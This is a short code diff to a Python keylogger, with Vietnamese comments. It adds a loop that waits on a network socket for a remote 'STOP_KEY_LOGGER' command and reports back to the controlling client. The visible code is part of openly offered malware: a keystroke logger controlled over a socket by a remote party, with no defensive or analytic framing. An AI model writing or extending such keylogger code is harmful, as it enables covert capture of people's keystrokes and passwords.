@@ -49,6 +49,17 @@ def start_keylogger(client_socket):
             listener.join()  # Chờ cho listener hoàn thành
         except Exception as e:
             print(f"Error in listener: {e}")
+            
+    # Lắng nghe lệnh từ client để dừng keylogger
+    try:
+        while True:
+            data = client_socket.recv(1024)
+            command = data.decode("utf-8")
+            if command == "STOP_KEY_LOGGER":
+                print("\nReceived stop command from client. Stopping keylogger...")
+                break
+    except Exception as e:
+        print(f"Error receiving command from client: {e}")        
 
     # Gửi thông báo đến client khi keylogger dừng
     client_socket.sendall("KEYLOGGER_STOPPED".encode("utf-8"))
